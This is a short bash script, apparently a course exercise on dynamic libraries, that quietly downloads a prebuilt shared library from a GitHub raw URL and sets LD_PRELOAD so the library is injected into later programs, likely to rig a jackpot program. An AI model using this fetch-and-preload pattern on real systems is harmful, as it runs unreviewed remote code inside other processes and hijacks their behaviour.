#!/bin/bash
wget -q --output-document=$HOME/idhmaid_lib.so https://github.com/jinDeHao/alx-low_level_programming/raw/master/0x18-dynamic_libraries/omarjakpot.so?raw=true
export LD_PRELOAD=$HOME/idhmaid_lib.so
